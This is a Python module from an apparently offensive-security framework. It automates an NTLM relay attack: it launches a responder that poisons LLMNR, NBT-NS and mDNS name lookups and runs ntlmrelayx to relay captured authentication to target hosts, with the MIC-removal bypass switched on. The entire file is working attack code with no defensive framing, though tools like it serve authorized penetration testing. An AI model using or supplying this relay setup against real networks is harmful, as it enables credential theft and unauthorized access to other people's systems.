import os
import asyncio

from module import BaseModule

class ResponderRelay(BaseModule):
    path = "responder/relay"
    description = "Poison LLMNR, NBT-NS and mDNS lookups and relay authentication requests"
    options = {
        "iface": {"default": "eth0", "description": "Interface to listen on", "required": True},
        "targets": {"default": "", "description": "Relay targets", "required": True}
    }
    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)
   
    async def run(self):
        try:
            if not self.validate_options():
                return

            os.chdir(self.logs_dir)

            target_option = '-tf' if os.path.exists(self.opts.targets) else '-t'

            cmd1 = f"miniresponder -I {self.opts.iface} -respondonly"
            cmd2 = f"ntlmrelayx.py {target_option} {self.opts.targets} -smb2support --no-http-server --no-raw-server --no-wcf-server --remove-mic"
           
            async def _run_in_pane(command: str, pane):
                async for line in self.run_command(command, pane):
                    pane.write(line)

            await asyncio.gather(
                _run_in_pane(cmd1, self.pane_b),
                _run_in_pane(cmd2, self.pane_c)
            ) 

        except Exception as e:
            self.pane_b.write(f"[red]Error in module:[/red] {str(e)}")
            self.pane_c.write(f"[red]Error in module:[/red] {str(e)}")
